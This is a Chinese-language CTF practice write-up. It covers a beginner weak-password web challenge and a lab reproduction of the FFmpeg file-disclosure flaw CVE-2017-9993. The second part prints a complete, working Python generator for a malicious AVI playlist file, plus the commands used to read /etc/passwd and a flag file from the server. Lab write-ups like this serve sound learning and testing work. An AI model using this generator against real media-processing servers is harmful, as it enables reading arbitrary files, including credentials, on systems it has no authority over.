---
title: ctf-atd-work-01
date: 2018-12-21 17:15:25
categories: ctf
tags:
 - ctf
 - web
description: 第一次练习
photos: https://i.loli.net/2019/01/08/5c33943a18eb8.jpg
---

## Web1
### 0x00 题目描述
![1](https://i.loli.net/2018/12/21/5c1c8b2e75e3f.png)

可视部分为 账号登入与密码登入
>这是一道入门级的web题
### 0x01 题目分析

随便输入
发现有弹窗提示

![2](https://i.loli.net/2018/12/21/5c1cb1f8c3956.png)

>在这个之前
>给的提示为`弱密码`
>后来大概为了提升自身意识
>然后就改成这个了

既然是弱密码
那么我们可以尝试一些弱密码
比如说啥`admin`、`root`等等

经过一些数据测试发现
当用户名为 `admin` 时
没有弹窗 说明用户名可能为这个

按照这种累题目的思路来看一定会有一个
指定的密码库

所以开始群寻找我们的密码库

### 0x02 题目复现

查看我们的响应发现有
`Hint: robots.txt`

![3](https://i.loli.net/2018/12/21/5c1c8cd92c78d.png)

当我们在url输入后发现啊
`21232f297a57a5a743894a0e4a801fc3`

![4](https://i.loli.net/2018/12/21/5c1c9252bc1b4.png)

于是我们又把这个输入到url
震惊的发现`Flag is not Here!`
不用慌
打开我们的`F12`
果然嘴上说着不要身体还是挺老实的

![5](https://i.loli.net/2018/12/21/5c1c93ed354fb.png)

于是 嗯 再次输入后
开始下载了
恭喜 喜提账号密码

![6](https://i.loli.net/2018/12/21/5c1c95e26200e.png)

![7](https://i.loli.net/2018/12/21/5c1c99f036a89.png)

## CVE-2017-9993
### 0x00 题目描述
![8](https://i.loli.net/2018/12/21/5c1c9a794321a.png)
似乎就是一个 文件上传

>FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序,可用于预览生成和视频转换的视频编码软件

### 0x00 漏洞分析

不会进行漏洞分析

脚本还没看懂

哭唧唧

只会使用脚本可以进行任意文件的读取

### 0x00 漏洞复现

1.编写脚本
`gen_xbin_avi.py`
```python  
#!/usr/bin/env python3
import struct
import argparse
import random
import string

AVI_HEADER = b"RIFF\x00\x00\x00\x00AVI LIST\x14\x01\x00\x00hdrlavih8\x00\x00\x00@\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00}\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LISTt\x00\x00\x00strlstrh8\x00\x00\x00txts\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00}\x00\x00\x00\x86\x03\x00\x00\x10'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\xa0\x00strf(\x00\x00\x00(\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x01\x00\x18\x00XVID\x00H\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LIST    movi"

ECHO_TEMPLATE = """### echoing {needed!r}
#EXT-X-KEY: METHOD=AES-128, URI=/dev/zero, IV=0x{iv}
#EXTINF:1,
#EXT-X-BYTERANGE: 16
/dev/zero
#EXT-X-KEY: METHOD=NONE
"""

# AES.new('\x00'*16).decrypt('\x00'*16)
GAMMA = b'\x14\x0f\x0f\x10\x11\xb5"=yXw\x17\xff\xd9\xec:'

FULL_PLAYLIST = """#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
{content}
#### random string to prevent caching: {rand}
#EXT-X-ENDLIST"""

EXTERNAL_REFERENCE_PLAYLIST = """
####  External reference: reading {size} bytes from {filename} (offset {offset})
#EXTINF:1,
#EXT-X-BYTERANGE: {size}@{offset}
{filename}
"""

XBIN_HEADER = b'XBIN\x1A\x20\x00\x0f\x00\x10\x04\x01\x00\x00\x00\x00'


def echo_block(block):
    assert len(block) == 16
    iv = ''.join(map('{:02x}'.format, [x ^ y for (x, y) in zip(block, GAMMA)]))
    return ECHO_TEMPLATE.format(needed=block, iv=iv)


def gen_xbin_sync():
    seq = []
    for i in range(60):
        if i % 2:
            seq.append(0)
        else:
            seq.append(128 + 64 - i - 1)
    for i in range(4, 0, -1):
        seq.append(128 + i - 1)
    seq.append(0)
    seq.append(0)
    for i in range(12, 0, -1):
        seq.append(128 + i - 1)
    seq.append(0)
    seq.append(0)
    return seq


def test_xbin_sync(seq):
    for start_ind in range(64):
        path = [start_ind]
        cur_ind = start_ind
        while cur_ind < len(seq):
            if seq[cur_ind] == 0:
                cur_ind += 3
            else:
                assert seq[cur_ind] & (64 + 128) == 128
                cur_ind += (seq[cur_ind] & 63) + 3
            path.append(cur_ind)
        assert cur_ind == len(seq), "problem for path {}".format(path)


def echo_seq(s):
    assert len(s) % 16 == 0
    res = []
    for i in range(0, len(s), 16):
        res.append(echo_block(s[i:i + 16]))
    return ''.join(res)


test_xbin_sync(gen_xbin_sync())

SYNC = echo_seq(gen_xbin_sync())


def make_playlist_avi(playlist, fake_packets=1000, fake_packet_len=3):
    content = b'GAB2\x00\x02\x00' + b'\x00' * 10 + playlist.encode('ascii')
    packet = b'00tx' + struct.pack('<I', len(content)) + content
    dcpkt = b'00dc' + struct.pack('<I',
                                  fake_packet_len) + b'\x00' * fake_packet_len
    return AVI_HEADER + packet + dcpkt * fake_packets


def gen_xbin_packet_header(size):
    return bytes([0] * 9 + [1] + [0] * 4 + [128 + size - 1, 10])


def gen_xbin_packet_playlist(filename, offset, packet_size):
    result = []
    while packet_size > 0:
        packet_size -= 16
        assert packet_size > 0
        part_size = min(packet_size, 64)
        packet_size -= part_size
        result.append(echo_block(gen_xbin_packet_header(part_size)))
        result.append(
            EXTERNAL_REFERENCE_PLAYLIST.format(
                size=part_size,
                offset=offset,
                filename=filename))
        offset += part_size
    return ''.join(result), offset


def gen_xbin_playlist(filename_to_read):
    pls = [echo_block(XBIN_HEADER)]
    next_delta = 5
    for max_offs, filename in (
            (5000, filename_to_read), (500, "file:///dev/zero")):
        offset = 0
        while offset < max_offs:
            for _ in range(10):
                pls_part, new_offset = gen_xbin_packet_playlist(
                    filename, offset, 0xf0 - next_delta)
                pls.append(pls_part)
                next_delta = 0
            offset = new_offset
        pls.append(SYNC)
    return FULL_PLAYLIST.format(content=''.join(pls), rand=''.join(
        random.choice(string.ascii_lowercase) for i in range(30)))


if __name__ == "__main__":
    parser = argparse.ArgumentParser('AVI+M3U+XBIN ffmpeg exploit generator')
    parser.add_argument(
        'filename',
        help='filename to be read from the server (prefix it with "file://")')
    parser.add_argument('output_avi', help='where to save the avi')
    args = parser.parse_args()
    assert '://' in args.filename, "ffmpeg needs explicit proto (forgot file://?)"
    content = gen_xbin_playlist(args.filename)
    avi = make_playlist_avi(content)
    output_name = args.output_avi

    with open(output_name, 'wb') as f:
        f.write(avi)
```

2.运行脚本 生成`.avi`上传文件
`python3 gen_xbin_avi.py file:///etc/passwd sxcurity.avi`

3.上传生成的 `sxcurity.avi`文件

![9](https://i.loli.net/2018/12/21/5c1ca33a00744.png)

4.介于我们的hint是`/usr/local/src/flag`那么我们直接针对路径下的文件进行操作

![10](https://i.loli.net/2018/12/21/5c1ca407e2c64.png)

生成代码：
`python3 gen_xbin_avi.py file:///usr/local/src/flag sxcurity.avi`

5.上传文件获取flag

![11](https://i.loli.net/2018/12/21/5c1ca61d50a66.png)